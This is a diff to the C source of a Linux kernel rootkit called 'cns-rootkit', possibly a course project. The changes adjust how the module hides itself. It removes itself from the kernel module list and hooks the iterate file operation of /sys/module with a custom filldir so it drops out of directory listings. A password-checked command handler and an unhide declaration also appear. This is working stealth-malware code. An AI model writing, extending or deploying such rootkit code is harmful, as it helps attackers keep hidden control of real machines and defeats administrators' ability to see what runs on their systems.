@@ -96,6 +96,8 @@ struct file_operations *get_fops(char *path) {
   return fop;
 }
 
+void cns_rootkit_unhide(void);
+
 void command_execute(char __user *buf, size_t count) {
   if(count <= sizeof(PASSWORD)) {
     printk(KERN_INFO "cns-rootkit: Command is too small %lu\n", sizeof(PASSWORD));
@@ -162,8 +164,9 @@ int cns_rootkit_sys_module_filldir(struct dir_context *ctx, const char *name, in
 }
 
 int cns_rootkit_sys_module_iterate(struct file *filep, struct dir_context *ctx) {
+  //struct dir_context new_ctx = {.actor = cns_rootkit_sys_module_filldir, .pos = ctx->pos};
   old_filldir = ctx->actor;
-  ctx->actor = cns_rootkit_sys_module_filldir;
+  *((filldir_t *)&ctx->actor) = cns_rootkit_sys_module_filldir;
   int (*old_iterate)(struct file *, struct dir_context *);
   old_iterate = hook_unpatch(cns_rootkit_sys_module_iterate);
   int res = old_iterate(filep, ctx);
@@ -184,7 +187,7 @@ void cns_rootkit_hide(void)
 
     list_del(&THIS_MODULE->list);
 
-    struct file_operations *sys_module_fop = get_fops("/sys/module");
+    struct file_operations *sys_module_fop = get_fops("/sys/module/");
 
     hook_add((void **)(&(sys_module_fop->iterate)), (void *)cns_rootkit_sys_module_iterate);
     hook_patch((void *) cns_rootkit_sys_module_iterate);
